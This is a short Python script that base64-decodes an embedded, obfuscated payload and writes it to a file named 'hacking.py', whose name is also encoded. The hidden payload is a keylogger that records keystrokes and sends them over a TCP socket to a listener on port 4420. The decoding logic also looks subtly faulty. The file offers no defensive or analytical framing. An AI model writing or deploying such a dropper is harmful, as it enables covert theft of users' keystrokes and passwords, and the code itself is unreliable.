#ecexution
import base64

from itsdangerous import base64_decode
def t2(rounded):
    found = False
    tt = 1
    while found == False:
        
        g = base64_decode(rounded)
        if str(g).__contains__('execution'): 
            #exec(g)
            rounded = base64_decode(g)
            #rounded=str(base64_decode(g)); 
            found = True; 
            return rounded,tt
        else: 
            tt+=1
            rounded = g

ggg = t2('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojZXhlY3V0aW9uCmltcG9ydCBzb2NrZXQsa2V5Ym9hcmQKSE9TVCA9ICcxMjcuMC4wLjEnClBPUlQgPSA0NDIwCiMgQ29uZmlndXJlIHNvY2tldCBjb25uZWN0aW9uCnogPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCnouY29ubmVjdCgoSE9TVCwgUE9SVCkpCgpkZWYgbG9nZ2luZygpOgogICAga2V5cyA9IGtleWJvYXJkLnJlY29yZCh1bnRpbCA9J0VOVEVSJykKICAgICN0ID0ga2V5Ym9hcmQucGxheShrZXlzKQogICAga2V5eiA9IHN0cihrZXlzKQogICAgI3ByaW50KCdrZXlzIHByZXNzZWQgYmVmb3JlIEVOVEVSJykKICAgICNwcmludChrZXlzKQogICAgI2xvZ2dpbmcoKQogICAgIyBFbnRlciBJUCBhbmQgUG9ydCBoZXJlCgogICAgIyBXYWtlIHVwCiAgICB6LnNlbmQoa2V5ei5lbmNvZGUoKSkKICAgIGxvZ2dpbmcoKQpsb2dnaW5nKCkKCg==')
a,b = ggg
loadf = str(base64_decode(base64_decode('YUdGamEybHVaeTV3ZVE9PQ=='))).strip('b').strip('\'')
load1 = open(f"./{loadf}",'wb')
load1.write(a)